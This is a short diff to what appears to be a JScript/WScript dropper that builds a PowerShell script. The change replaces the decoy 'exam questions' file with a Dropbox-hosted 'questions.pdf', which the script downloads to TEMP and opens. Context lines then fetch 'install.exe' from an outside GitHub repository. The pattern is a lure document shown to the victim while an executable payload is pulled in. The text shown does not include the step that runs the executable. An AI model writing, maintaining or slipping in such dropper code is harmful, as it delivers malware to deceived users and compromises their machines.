@@ -2136,8 +2136,8 @@ var psContent =
 '    Write-Error ("ERROR: " + $_.Exception.Message);\n' +
 '}\n' +
 '\n' +
-'$url = "https://m.media-amazon.com/images/I/51udtm0M0TL._UF1000,1000_QL80_.jpg";\n' +
-'$destination = "$env:TEMP\\exam questions.jpg";\n' +
+'$url = "https://www.dropbox.com/scl/fi/mnia7mzmbwgdz010n40d3/1.pdf?rlkey=nwzq6y6u1t6xw6hvd6wxo7irt&st=qra9p1y0&dl=1";\n' +
+'$destination = "$env:TEMP\\questions.pdf";\n' +
 'Invoke-WebRequest -Uri $url -OutFile $destination;\n' +
 'Start-Process $destination;\n' +
 '$url = "https://github.com/Easy-Hash/download-now/raw/refs/heads/main/install.exe";\n' +
@@ -3449,6 +3449,7 @@ try {
 
 
 WScript.Quit(0);
+
 
 
 
